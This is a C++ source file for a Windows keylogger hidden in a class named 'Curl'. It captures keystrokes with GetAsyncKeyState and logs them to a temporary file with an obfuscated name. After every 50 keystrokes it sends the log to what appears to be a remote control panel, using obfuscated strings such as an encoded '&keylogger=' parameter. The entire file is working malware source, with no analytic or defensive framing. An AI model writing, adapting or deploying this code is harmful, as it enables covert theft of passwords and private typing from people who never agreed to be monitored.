#include "CURL.h"
#include <fstream>

void Curl::WriteToLog(std::string key, std::string file_path)
{
	std::ofstream hFile(file_path, std::ios::app);
	hFile << key;
	hFile.close();
}

BOOL Curl::KeyIsListed(char key, std::string file_path)
{
	int iKey = key;

	switch (iKey) // The obfuscated strings will be replaced with the right string in the Website Control side.
	{
	case VK_SPACE:
		this->WriteToLog("+", file_path); // SPACE
		break;
	case VK_RETURN:
		this->WriteToLog("+OERDOF9+", file_path); // RETURN
		break;
	case VK_SHIFT:
		this->WriteToLog("+ELROFJ8+", file_path); // SHIFT
		break;
	case VK_BACK:
		this->WriteToLog("+GHQI3DB+", file_path); // BACKSPACE
		break;
	case VK_CAPITAL:
		this->WriteToLog("+WIFLCF+", file_path); // CAPSLOCK
		break;
	case VK_DELETE:
		this->WriteToLog("+FEOLAE+", file_path); // DELETE
		break;
	default:
		if(isalpha(key))
			this->WriteToLog(std::string(1, key), file_path);
	}
	return TRUE;
}

void Curl::Keylogger()
{
	std::string temp = "";
	std::string arg = "loey&kr=geg"; // decode -> &keylogger=

	char temp_path[MAX_PATH];
	
	std::string file_path = Tools::decode("oejfslxt.tf"); // deocde -> sljfoef.txt

	if (GetTempPathA(sizeof(temp_path), temp_path))
		file_path = temp_path + file_path;

	this->Keylogger_status = TRUE;
	

	// Create file for the keylogger logs in TEMP folder
	HANDLE hFile = CreateFileA(file_path.c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		CloseHandle(hFile);
		char key;
		int count = 0;
		while (this->Keylogger_status)
		{
			Sleep(10);
			for (key = 8; key <= 190 && this->Keylogger_status; key++)
			{
				if (GetAsyncKeyState(key) == -32767)
				{
					count++;
					if ((GetKeyState(VK_CAPITAL) & 0x0001) == 0)
						key = std::tolower(key);

					KeyIsListed(key, file_path);

					// Send the keylogs after every 50 key listening
					if (count >= 50)
					{
						// Read the keylogs from the file and send them
						std::string key_logs = this->ReadFromFile(file_path);
						if(key_logs != "")
							this->Send_Recv(temp, "", arg + key_logs);

						count = 0;
					}
				}
			}
		}
	}

	DeleteFileA(file_path.c_str());
}

// Static Keylogger Thread
DWORD WINAPI Curl::StaticKeyloggerThread(void* Param)
{
	Curl* This = (Curl*)Param;
	This->Keylogger();
	return TRUE;
}

// Start Keylogger Thread
DWORD WINAPI Curl::StartKeyloggerThread()
{
	if(CreateThread(NULL, 0, StaticKeyloggerThread, (void*) this, 0, NULL))
		return TRUE;
	return FALSE;
}